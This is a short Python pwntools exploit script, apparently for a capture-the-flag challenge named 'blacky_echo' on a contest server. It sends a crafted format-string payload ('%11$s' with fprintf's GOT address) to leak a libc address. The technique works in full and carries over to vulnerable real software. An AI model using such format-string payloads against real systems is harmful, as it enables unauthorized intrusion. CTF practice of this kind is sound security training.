#!/usr/bin/env python
from pwn import *

SZ = 0x2003f
e = ELF("./blacky_echo", checksec=False)

if __name__ == "__main__":
    p = remote("challs.m0lecon.it", 9011)
        
    p.recvuntil("Size: ")
    p.sendline(str(SZ).encode())

    p.recvuntil("Input: ")

    payload  = b"A" * 0x1000d
    payload += b"%11$s"
    payload += b"B" * 3
    payload += p64(e.got["fprintf"])

    p.sendline(payload)

    leak = p.recvuntil("If you are").split(b"Error: Format err")[1][:-10]
    success("fprintf address: " + hex(u64(leak[3:].split(b"BBB")[0].ljust(8, b"\x00"))))
    p.close()